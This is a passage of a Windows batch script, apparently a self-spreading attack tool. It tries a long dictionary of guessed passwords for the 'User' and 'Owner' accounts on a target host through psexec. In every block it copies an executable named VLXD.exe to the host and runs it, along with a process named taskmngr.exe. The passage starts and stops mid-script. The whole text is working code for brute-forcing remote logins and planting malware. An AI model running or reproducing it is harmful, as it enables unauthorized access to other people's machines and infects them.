   psexec \\%1 -u User -p "poop" -d taskmngr.exe
   goto end
   :Userpoopie
   psexec \\%1 -u User -p "poopie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "poopie" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "poopie" -d taskmngr.exe
   psexec \\%1 -u User -p "poopie" -d VLXD.exe -o
   psexec \\%1 -u User -p "poopie" -d taskmngr.exe
   goto end
   :Userweed
   psexec \\%1 -u User -p "weed" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "weed" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "weed" -d taskmngr.exe
   psexec \\%1 -u User -p "weed" -d VLXD.exe -o
   psexec \\%1 -u User -p "weed" -d taskmngr.exe
   goto end
   :Userwater
   psexec \\%1 -u User -p "water" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "water" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "water" -d taskmngr.exe
   psexec \\%1 -u User -p "water" -d VLXD.exe -o
   psexec \\%1 -u User -p "water" -d taskmngr.exe
   goto end
   :Usercool
   psexec \\%1 -u User -p "cool" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "cool" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "cool" -d taskmngr.exe
   psexec \\%1 -u User -p "cool" -d VLXD.exe -o
   psexec \\%1 -u User -p "cool" -d taskmngr.exe
   goto end
   :Userjoint
   psexec \\%1 -u User -p "joint" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "joint" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "joint" -d taskmngr.exe
   psexec \\%1 -u User -p "joint" -d VLXD.exe -o
   psexec \\%1 -u User -p "joint" -d taskmngr.exe
   goto end
   :Usercrack
   psexec \\%1 -u User -p "crack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "crack" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "crack" -d taskmngr.exe
   psexec \\%1 -u User -p "crack" -d VLXD.exe -o
   psexec \\%1 -u User -p "crack" -d taskmngr.exe
   goto end
   :Userdanger
   psexec \\%1 -u User -p "danger" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "danger" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "danger" -d taskmngr.exe
   psexec \\%1 -u User -p "danger" -d VLXD.exe -o
   psexec \\%1 -u User -p "danger" -d taskmngr.exe
   goto end
   :Userweiner
   psexec \\%1 -u User -p "weiner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "weiner" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "weiner" -d taskmngr.exe
   psexec \\%1 -u User -p "weiner" -d VLXD.exe -o
   psexec \\%1 -u User -p "weiner" -d taskmngr.exe
   goto end
   :Userelectrical
   psexec \\%1 -u User -p "electrical" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "electrical" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "electrical" -d taskmngr.exe
   psexec \\%1 -u User -p "electrical" -d VLXD.exe -o
   psexec \\%1 -u User -p "electrical" -d taskmngr.exe
   goto end
   :Userelectric
   psexec \\%1 -u User -p "electric" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "electric" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "electric" -d taskmngr.exe
   psexec \\%1 -u User -p "electric" -d VLXD.exe -o
   psexec \\%1 -u User -p "electric" -d taskmngr.exe
   goto end
   :Userelectricity
   psexec \\%1 -u User -p "electricity" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "electricity" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "electricity" -d taskmngr.exe
   psexec \\%1 -u User -p "electricity" -d VLXD.exe -o
   psexec \\%1 -u User -p "electricity" -d taskmngr.exe
   goto end
   :Userpenis
   psexec \\%1 -u User -p "penis" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "penis" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "penis" -d taskmngr.exe
   psexec \\%1 -u User -p "penis" -d VLXD.exe -o
   psexec \\%1 -u User -p "penis" -d taskmngr.exe
   goto end
   :Usercent
   psexec \\%1 -u User -p "cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "cent" -d taskmngr.exe
   psexec \\%1 -u User -p "cent" -d VLXD.exe -o
   psexec \\%1 -u User -p "cent" -d taskmngr.exe
   goto end
   :User50cent
   psexec \\%1 -u User -p "50cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "50cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "50cent" -d taskmngr.exe
   psexec \\%1 -u User -p "50cent" -d VLXD.exe -o
   psexec \\%1 -u User -p "50cent" -d taskmngr.exe
   goto end
   :Usereminem
   psexec \\%1 -u User -p "eminem" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "eminem" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "eminem" -d taskmngr.exe
   psexec \\%1 -u User -p "eminem" -d VLXD.exe -o
   psexec \\%1 -u User -p "eminem" -d taskmngr.exe
   goto end
   :Uservagina
   psexec \\%1 -u User -p "vagina" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "vagina" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "vagina" -d taskmngr.exe
   psexec \\%1 -u User -p "vagina" -d VLXD.exe -o
   psexec \\%1 -u User -p "vagina" -d taskmngr.exe
   goto end
   :Usercunt
   psexec \\%1 -u User -p "cunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "cunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "cunt" -d taskmngr.exe
   psexec \\%1 -u User -p "cunt" -d VLXD.exe -o
   psexec \\%1 -u User -p "cunt" -d taskmngr.exe
   goto end
   :Userpussy
   psexec \\%1 -u User -p "pussy" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "pussy" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "pussy" -d taskmngr.exe
   psexec \\%1 -u User -p "pussy" -d VLXD.exe -o
   psexec \\%1 -u User -p "pussy" -d taskmngr.exe
   goto end
   :Usercock
   psexec \\%1 -u User -p "cock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "cock" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "cock" -d taskmngr.exe
   psexec \\%1 -u User -p "cock" -d VLXD.exe -o
   psexec \\%1 -u User -p "cock" -d taskmngr.exe
   goto end
   :Userdick
   psexec \\%1 -u User -p "dick" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "dick" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "dick" -d taskmngr.exe
   psexec \\%1 -u User -p "dick" -d VLXD.exe -o
   psexec \\%1 -u User -p "dick" -d taskmngr.exe
   psexec \\%1 -u User -p dick -c -f -d VLXD.exe
   goto end
   :Usershithead
   psexec \\%1 -u User -p "shithead" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "shithead" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "shithead" -d taskmngr.exe
   psexec \\%1 -u User -p "shithead" -d VLXD.exe -o
   psexec \\%1 -u User -p "shithead" -d taskmngr.exe
   goto end
   :Usershotgun
   psexec \\%1 -u User -p "shotgun" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "shotgun" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "shotgun" -d taskmngr.exe
   psexec \\%1 -u User -p "shotgun" -d VLXD.exe -o
   psexec \\%1 -u User -p "shotgun" -d taskmngr.exe
   goto end
   :Userblunt
   psexec \\%1 -u User -p "blunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "blunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "blunt" -d taskmngr.exe
   psexec \\%1 -u User -p "blunt" -d VLXD.exe -o
   psexec \\%1 -u User -p "blunt" -d taskmngr.exe
   goto end
   :Userglock
   psexec \\%1 -u User -p "glock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "glock" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "glock" -d taskmngr.exe
   psexec \\%1 -u User -p "glock" -d VLXD.exe -o
   psexec \\%1 -u User -p "glock" -d taskmngr.exe
   goto end
   :Userexecutable
   psexec \\%1 -u User -p "executable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "executable" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "executable" -d taskmngr.exe
   psexec \\%1 -u User -p "executable" -d VLXD.exe -o
   psexec \\%1 -u User -p "executable" -d taskmngr.exe
   goto end
   :Userbong
   psexec \\%1 -u User -p "bong" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "bong" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "bong" -d taskmngr.exe
   psexec \\%1 -u User -p "bong" -d VLXD.exe -o
   psexec \\%1 -u User -p "bong" -d taskmngr.exe
   goto end
   :Userdildo
   psexec \\%1 -u User -p "dildo" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "dildo" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "dildo" -d taskmngr.exe
   psexec \\%1 -u User -p "dildo" -d VLXD.exe -o
   psexec \\%1 -u User -p "dildo" -d taskmngr.exe
   goto end
   :Userbaseball
   psexec \\%1 -u User -p "baseball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "baseball" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "baseball" -d taskmngr.exe
   psexec \\%1 -u User -p "baseball" -d VLXD.exe -o
   psexec \\%1 -u User -p "baseball" -d taskmngr.exe
   goto end
   :Userbasketball
   psexec \\%1 -u User -p "basketball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "basketball" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "basketball" -d taskmngr.exe
   psexec \\%1 -u User -p "basketball" -d VLXD.exe -o
   psexec \\%1 -u User -p "basketball" -d taskmngr.exe
   goto end
   :Userfootball
   psexec \\%1 -u User -p "football" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "football" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "football" -d taskmngr.exe
   psexec \\%1 -u User -p "football" -d VLXD.exe -o
   psexec \\%1 -u User -p "football" -d taskmngr.exe
   goto end
   :Usersoccer
   psexec \\%1 -u User -p "soccer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "soccer" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "soccer" -d taskmngr.exe
   psexec \\%1 -u User -p "soccer" -d VLXD.exe -o
   psexec \\%1 -u User -p "soccer" -d taskmngr.exe
   goto end
   :Userpot
   psexec \\%1 -u User -p "pot" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "pot" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "pot" -d taskmngr.exe
   psexec \\%1 -u User -p "pot" -d VLXD.exe -o
   psexec \\%1 -u User -p "pot" -d taskmngr.exe
   goto end
   :Userdope
   psexec \\%1 -u User -p "dope" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "dope" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "dope" -d taskmngr.exe
   psexec \\%1 -u User -p "dope" -d VLXD.exe -o
   psexec \\%1 -u User -p "dope" -d taskmngr.exe
   goto end
   :Usermaryjane
   psexec \\%1 -u User -p "maryjane" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "maryjane" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "maryjane" -d taskmngr.exe
   psexec \\%1 -u User -p "maryjane" -d VLXD.exe -o
   psexec \\%1 -u User -p "maryjane" -d taskmngr.exe
   goto end
   :Usermarijuana
   psexec \\%1 -u User -p "marijuana" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "marijuana" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "marijuana" -d taskmngr.exe
   psexec \\%1 -u User -p "marijuana" -d VLXD.exe -o
   psexec \\%1 -u User -p "marijuana" -d taskmngr.exe
   goto end
   :Usermoney
   psexec \\%1 -u User -p "money" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "money" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "money" -d taskmngr.exe
   psexec \\%1 -u User -p "money" -d VLXD.exe -o
   psexec \\%1 -u User -p "money" -d taskmngr.exe
   goto end
   :Usergirl
   psexec \\%1 -u User -p "girl" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "girl" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "girl" -d taskmngr.exe
   psexec \\%1 -u User -p "girl" -d VLXD.exe -o
   psexec \\%1 -u User -p "girl" -d taskmngr.exe
   goto end
   :Usergirls
   psexec \\%1 -u User -p "girls" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "girls" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "girls" -d taskmngr.exe
   psexec \\%1 -u User -p "girls" -d VLXD.exe -o
   psexec \\%1 -u User -p "girls" -d taskmngr.exe
   goto end
   :Userwoman
   psexec \\%1 -u User -p "woman" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "woman" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "woman" -d taskmngr.exe
   psexec \\%1 -u User -p "woman" -d VLXD.exe -o
   psexec \\%1 -u User -p "woman" -d taskmngr.exe
   goto end
   :Userwomen
   psexec \\%1 -u User -p "women" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "women" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "women" -d taskmngr.exe
   psexec \\%1 -u User -p "women" -d VLXD.exe -o
   psexec \\%1 -u User -p "women" -d taskmngr.exe
   goto end
   :Userfemale
   psexec \\%1 -u User -p "female" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "female" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "female" -d taskmngr.exe
   psexec \\%1 -u User -p "female" -d VLXD.exe -o
   psexec \\%1 -u User -p "female" -d taskmngr.exe
   goto end
   :Useramerica
   psexec \\%1 -u User -p "america" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "america" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "america" -d taskmngr.exe
   psexec \\%1 -u User -p "america" -d VLXD.exe -o
   psexec \\%1 -u User -p "america" -d taskmngr.exe
   goto end
   :Userusa
   psexec \\%1 -u User -p "usa" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "usa" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "usa" -d taskmngr.exe
   psexec \\%1 -u User -p "usa" -d VLXD.exe -o
   psexec \\%1 -u User -p "usa" -d taskmngr.exe
   goto end
   :Usergod
   psexec \\%1 -u User -p "god" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "god" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "god" -d taskmngr.exe
   psexec \\%1 -u User -p "god" -d VLXD.exe -o
   psexec \\%1 -u User -p "god" -d taskmngr.exe
   goto end
   :Userjesus
   psexec \\%1 -u User -p "jesus" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "jesus" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "jesus" -d taskmngr.exe
   psexec \\%1 -u User -p "jesus" -d VLXD.exe -o
   psexec \\%1 -u User -p "jesus" -d taskmngr.exe
   goto end
   :Usercomputer
   psexec \\%1 -u User -p "computer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "computer" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "computer" -d taskmngr.exe
   psexec \\%1 -u User -p "computer" -d VLXD.exe -o
   psexec \\%1 -u User -p "computer" -d taskmngr.exe
   goto end
   :Usertechnology
   psexec \\%1 -u User -p "technology" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "technology" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "technology" -d taskmngr.exe
   psexec \\%1 -u User -p "technology" -d VLXD.exe -o
   psexec \\%1 -u User -p "technology" -d taskmngr.exe
   goto end
   :Userporn
   psexec \\%1 -u User -p "porn" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "porn" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "porn" -d taskmngr.exe
   psexec \\%1 -u User -p "porn" -d VLXD.exe -o
   psexec \\%1 -u User -p "porn" -d taskmngr.exe
   goto end
   :Userhack
   psexec \\%1 -u User -p "hack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "hack" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "hack" -d taskmngr.exe
   psexec \\%1 -u User -p "hack" -d VLXD.exe -o
   psexec \\%1 -u User -p "hack" -d taskmngr.exe
   goto end
   :Userclock
   psexec \\%1 -u User -p "clock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "clock" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "clock" -d taskmngr.exe
   psexec \\%1 -u User -p "clock" -d VLXD.exe -o
   psexec \\%1 -u User -p "clock" -d taskmngr.exe
   goto end
   :Userchurch
   psexec \\%1 -u User -p "church" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "church" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "church" -d taskmngr.exe
   psexec \\%1 -u User -p "church" -d VLXD.exe -o
   psexec \\%1 -u User -p "church" -d taskmngr.exe
   goto end
   :Usertemp
   psexec \\%1 -u User -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "temp" -d taskmngr.exe
   psexec \\%1 -u User -p "temp" -d VLXD.exe -o
   psexec \\%1 -u User -p "temp" -d taskmngr.exe
   goto end
   :Owner
   psexec \\%1 -u Owner -p "" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "" -d taskmngr.exe
   psexec \\%1 -u Owner -p "" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "" -d taskmngr.exe
   goto end
   :Ownerpass123
   psexec \\%1 -u Owner -p "pass123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "pass123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pass123" -d taskmngr.exe
   psexec \\%1 -u Owner -p "pass123" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pass123" -d taskmngr.exe
   goto end
   :Ownersomething
   psexec \\%1 -u Owner -p "something" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "something" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "something" -d taskmngr.exe
   psexec \\%1 -u Owner -p "something" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "something" -d taskmngr.exe
   goto end
   :Ownermypass
   psexec \\%1 -u Owner -p "mypass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "mypass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "mypass" -d taskmngr.exe
   psexec \\%1 -u Owner -p "mypass" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "mypass" -d taskmngr.exe
   goto end
   :Ownerlogin
   psexec \\%1 -u Owner -p "login" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "login" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "login" -d taskmngr.exe
   psexec \\%1 -u Owner -p "login" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "login" -d taskmngr.exe
   goto end
   :Owneraccess
   psexec \\%1 -u Owner -p "access" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "access" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "access" -d taskmngr.exe
   psexec \\%1 -u Owner -p "access" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "access" -d taskmngr.exe
   goto end
   :Ownerpassword
   psexec \\%1 -u Owner -p "password" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "password" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "password" -d taskmngr.exe
   psexec \\%1 -u Owner -p "password" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "password" -d taskmngr.exe
   goto end
   :Ownermatrix
   psexec \\%1 -u Owner -p "matrix" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "matrix" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "matrix" -d taskmngr.exe
   psexec \\%1 -u Owner -p "matrix" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "matrix" -d taskmngr.exe
   goto end
   :Ownersecurity
   psexec \\%1 -u Owner -p "security" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "security" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "security" -d taskmngr.exe
   psexec \\%1 -u Owner -p "security" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "security" -d taskmngr.exe
   goto end
   :Ownersuccess
   psexec \\%1 -u Owner -p "success" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "success" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "success" -d taskmngr.exe
   psexec \\%1 -u Owner -p "success" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "success" -d taskmngr.exe
   goto end
   :Ownerspecial
   psexec \\%1 -u Owner -p "special" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "special" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "special" -d taskmngr.exe
   psexec \\%1 -u Owner -p "special" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "special" -d taskmngr.exe
   goto end
   :Ownerultra
   psexec \\%1 -u Owner -p "ultra" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "ultra" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "ultra" -d taskmngr.exe
   psexec \\%1 -u Owner -p "ultra" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "ultra" -d taskmngr.exe
   goto end
   :Ownerpass
   psexec \\%1 -u Owner -p "pass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "pass" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pass" -d taskmngr.exe
   psexec \\%1 -u Owner -p "pass" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "pass" -d taskmngr.exe
   goto end
   :Ownerenable
   psexec \\%1 -u Owner -p "enable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "enable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "enable" -d taskmngr.exe
   psexec \\%1 -u Owner -p "enable" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "enable" -d taskmngr.exe
   goto end
   :Ownerpasswd
   psexec \\%1 -u Owner -p "passwd" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "passwd" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "passwd" -d taskmngr.exe
   psexec \\%1 -u Owner -p "passwd" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "passwd" -d taskmngr.exe
   goto end
   :Ownerinternet
   psexec \\%1 -u Owner -p "internet" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "internet" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "internet" -d taskmngr.exe
   psexec \\%1 -u Owner -p "internet" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "internet" -d taskmngr.exe
   goto end
   :Ownernetwork
   psexec \\%1 -u Owner -p "network" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "network" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "network" -d taskmngr.exe
   psexec \\%1 -u Owner -p "network" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "network" -d taskmngr.exe
   goto end
   :Owneredu
   psexec \\%1 -u Owner -p "edu" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "edu" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "edu" -d taskmngr.exe
   psexec \\%1 -u Owner -p "edu" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "edu" -d taskmngr.exe
   goto end
   :Ownerowner
   psexec \\%1 -u Owner -p "owner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "owner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "owner" -d taskmngr.exe
   psexec \\%1 -u Owner -p "owner" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "owner" -d taskmngr.exe
   goto end
   :Ownerlocal
   psexec \\%1 -u Owner -p "local" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "local" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "local" -d taskmngr.exe
   psexec \\%1 -u Owner -p "local" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "local" -d taskmngr.exe
   goto end
   :Ownerremote
   psexec \\%1 -u Owner -p "remote" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "remote" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "remote" -d taskmngr.exe
   psexec \\%1 -u Owner -p "remote" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "remote" -d taskmngr.exe
   goto end
   :Ownerlan
   psexec \\%1 -u Owner -p "lan" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "lan" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "lan" -d taskmngr.exe
   psexec \\%1 -u Owner -p "lan" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "lan" -d taskmngr.exe
   goto end
   :Ownerroot
   psexec \\%1 -u Owner -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "root" -d taskmngr.exe
   psexec \\%1 -u Owner -p "root" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "root" -d taskmngr.exe
   goto end
   :Ownerbitch
   psexec \\%1 -u Owner -p "bitch" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "bitch" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "bitch" -d taskmngr.exe
   psexec \\%1 -u Owner -p "bitch" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "bitch" -d taskmngr.exe
   goto end
   :Ownerfault
   psexec \\%1 -u Owner -p "fault" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "fault" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "fault" -d taskmngr.exe
   psexec \\%1 -u Owner -p "fault" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "fault" -d taskmngr.exe
   goto end
   :Ownercat
   psexec \\%1 -u Owner -p "cat" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "cat" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cat" -d taskmngr.exe
   psexec \\%1 -u Owner -p "cat" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "cat" -d taskmngr.exe
   goto end
   :Owner911
   psexec \\%1 -u Owner -p "911" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "911" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "911" -d taskmngr.exe
   psexec \\%1 -u Owner -p "911" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "911" -d taskmngr.exe
   goto end
   :Ownertowers
   psexec \\%1 -u Owner -p "towers" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "towers" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "towers" -d taskmngr.exe
   psexec \\%1 -u Owner -p "towers" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "towers" -d taskmngr.exe
   goto end
   :Owner123
   psexec \\%1 -u Owner -p "123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "123" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "123" -d taskmngr.exe
   psexec \\%1 -u Owner -p "123" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "123" -d taskmngr.exe
   goto end
   :Owner1234
   psexec \\%1 -u Owner -p "1234" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "1234" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "1234" -d taskmngr.exe
   psexec \\%1 -u Owner -p "1234" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "1234" -d taskmngr.exe
   goto end
   :Owner12345
   psexec \\%1 -u Owner -p "12345" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "12345" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "12345" -d taskmngr.exe
   psexec \\%1 -u Owner -p "12345" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "12345" -d taskmngr.exe
   goto end
   :Owner123456
   psexec \\%1 -u Owner -p "123456" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "123456" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "123456" -d taskmngr.exe
   psexec \\%1 -u Owner -p "123456" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "123456" -d taskmngr.exe
   goto end
   :Owner654321
   psexec \\%1 -u Owner -p "654321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Owner -p "654321" -f -c -d VLXD.exe -o
   psexec \\%1 -u Owner -p "654321" -d taskmngr.exe
   psexec \\%1 -u Owner -p "654321" -d VLXD.exe -o
   psexec \\%1 -u Owner -p "654321" -d taskmngr.exe
   goto end
   :Owner54321
